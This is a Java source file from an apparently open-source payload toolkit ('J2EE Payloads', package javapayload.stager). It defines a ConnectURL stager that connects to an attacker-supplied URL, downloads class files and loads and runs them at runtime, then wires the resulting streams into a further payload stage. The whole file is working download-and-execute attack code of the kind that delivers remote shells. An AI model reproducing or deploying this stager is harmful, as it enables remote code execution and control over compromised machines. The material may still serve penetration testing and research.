/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stager;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;

public class ConnectURL extends Stager {

	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
		String baseURL = parameters[1];
		String token = "s" + parameters[2];
		String timeout = parameters[3];
		final DataInputStream in = new DataInputStream(new URL(baseURL + "?bs=1").openStream());
		Class clazz;
		int length = in.readInt();
		do {
			final byte[] classfile = new byte[length];
			in.readFully(classfile);
			clazz = define(classfile);
			length = in.readInt();
		} while (length > 0);
		Class str = Class.forName("java.lang.String");
		Object[] streams = (Object[]) clazz.getMethod("go", new Class[] { str, str, str }).invoke(null, new Object[] { baseURL, token, timeout });
		bootstrap((InputStream) streams[0], (OutputStream) streams[1], parameters);
	}

	public void waitReady() throws InterruptedException {
	}
}
